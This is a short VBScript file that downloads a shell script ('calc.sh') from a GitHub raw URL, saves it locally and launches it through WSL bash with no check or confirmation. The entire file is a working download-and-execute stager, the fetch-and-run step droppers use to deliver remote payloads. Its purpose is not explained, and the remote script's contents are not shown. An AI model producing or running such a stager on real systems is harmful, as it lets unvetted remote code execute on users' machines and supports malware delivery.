' VBScript to download a file from the internet and execute it

Dim httpRequest, stream, shell
Set httpRequest = CreateObject("MSXML2.XMLHTTP")
Set shell = CreateObject("WScript.Shell")

' Specify the URL of the file to download
Dim fileUrl
fileUrl = "https://raw.githubusercontent.com/GloAlgara/ucases.github.io/main/calc.sh"

' Specify the path where the file should be saved
Dim filePath
filePath = ".\calc.sh"

' Open the HTTP request
httpRequest.Open "GET", fileUrl, False
httpRequest.Send

If httpRequest.Status = 200 Then
    ' Create the stream object to write the content to a file
    Set stream = CreateObject("ADODB.Stream")
    stream.Open
    stream.Type = 1 'Binary
    stream.Write httpRequest.ResponseBody
    stream.Position = 0
    
    ' Save the file
    stream.SaveToFile filePath, 2 '2 = overwrite if file already exists
    stream.Close
    Set stream = Nothing

    ' Execute the downloaded script using bash
    shell.Run "wsl bash -c 'bash " & filePath & "; exec bash'", 1, False '1 = show window, False = do not wait for completion
Else
    MsgBox "Failed to download the file. Status: " & httpRequest.Status
End If

Set httpRequest = Nothing
Set shell = Nothing
